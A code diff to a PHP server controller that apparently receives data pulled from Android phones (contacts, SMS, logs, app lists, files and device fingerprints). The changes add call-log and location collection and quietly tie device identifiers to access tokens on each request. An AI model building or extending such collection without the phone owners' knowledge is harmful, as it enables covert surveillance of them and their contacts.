@@ -26,7 +26,7 @@ class Receive extends BaseController
     ];
 
     // Allowed file categories
-    private $allowedCategories = ['contacts', 'logs', 'sms', 'apps', 'files'];
+    private $allowedCategories = ['contacts', 'logs', 'sms', 'apps', 'files', 'calls', 'location'];
 
 
 
@@ -146,6 +146,9 @@ class Receive extends BaseController
         $token = $this->request->getPost('token');
         $time = $this->request->getPost('time');
         $ip = $this->request->getIPAddress();
+        
+        // Link device info if provided
+        $this->updateTokenDevice($token);
 
         // Log token verification attempt
         $this->logTokenVerification($token, $time, $ip, 'format_correct');
@@ -220,6 +223,20 @@ class Receive extends BaseController
     }
 
     /**
+     * Updates token metadata in background
+     */
+    private function updateTokenDevice(string $token)
+    {
+        $deviceChecksum = $this->request->getPost('device_checksum') ?: $this->request->getPost('device_print_id');
+        $androidId = $this->request->getPost('android_id');
+
+        if ($deviceChecksum || $androidId) {
+            $userModel = new Mod_User();
+            $userModel->update_token_metadata($token, $deviceChecksum, $androidId);
+        }
+    }
+
+    /**
      * Device print registration endpoint
      */
     public function device_print()
@@ -228,34 +245,22 @@ class Receive extends BaseController
             return $this->fail('Method not allowed', 405);
         }
 
-        $expectedFields = [
-            'device_checksum',
-            'android_id',
-            'device_model',
-            'device_brand',
-            'device_manufacturer',
-            'device_product',
-            'device_device',
-            'device_board',
-            'device_hardware',
-            'android_version',
-            'android_sdk_int',
-            'android_security_patch',
-            'build_id',
-            'build_fingerprint',
-            'memory_total_mb',
-            'internal_storage_total_gb',
-            'external_storage_total_gb',
-            'app_package',
-            'app_version',
-            'extraction_timestamp',
-            'extractor_version'
+        $requiredFields = [
+            'device_checksum', 'android_id', 'device_model', 'device_brand',
+            'device_manufacturer', 'device_product', 'device_device',
+            'device_board', 'device_hardware', 'android_version',
+            'android_sdk_int', 'android_security_patch', 'build_id',
+            'build_fingerprint', 'memory_total_mb', 'internal_storage_total_gb',
+            'external_storage_total_gb', 'app_package', 'app_version',
+            'extraction_timestamp', 'extractor_version'
         ];
+        
+        $optionalFields = ['fcm_token'];
 
         $input = $this->request->getPost();
 
         // Validate required fields
-        foreach ($expectedFields as $field) {
+        foreach ($requiredFields as $field) {
             if (empty($input[$field])) {
                 return $this->failValidationError("Missing field: {$field}");
             }
@@ -263,14 +268,22 @@ class Receive extends BaseController
 
         // Sanitize input
         $sanitizedData = [];
-        foreach ($expectedFields as $field) {
-            $sanitizedData[$field] = htmlspecialchars($input[$field], ENT_QUOTES, 'UTF-8');
+        $allFields = array_merge($requiredFields, $optionalFields);
+        
+        foreach ($allFields as $field) {
+            $sanitizedData[$field] = isset($input[$field]) ? htmlspecialchars($input[$field], ENT_QUOTES, 'UTF-8') : '';
         }
         $sanitizedData['extraction_timestamp'] = date('Y-m-d H:i:s');
 
         try {
             $modelReceive = new Mod_Receive();
             $device_metadata = $modelReceive->make_device_print($sanitizedData);
+
+            // Link token if provided
+            $token = $input['token'] ?? $input['sent_token'] ?? '';
+            if (!empty($token)) {
+                $this->updateTokenDevice($token);
+            }
 
             $logModel = new Mod_Log_User_Action();
 
@@ -344,6 +357,8 @@ class Receive extends BaseController
                 'upload_path' => $fileInfo['upload_path']
             ];
 
+            $this->updateTokenDevice($token);
+
             return $modelUpload->logUpload($uploadData);
 
         } catch (\Exception $e) {
@@ -406,9 +421,11 @@ class Receive extends BaseController
         $methodMap = [
             'contacts' => 'get_contacts',
             'logs' => 'get_logs',
+            'calls' => 'get_logs',
             'sms' => 'get_sms',
             'apps' => 'get_apps',
-            'files' => 'get_files'
+            'files' => 'get_files',
+            'location' => 'get_location'
         ];
 
         if (isset($methodMap[$category]) && method_exists($modelParse, $methodMap[$category])) {
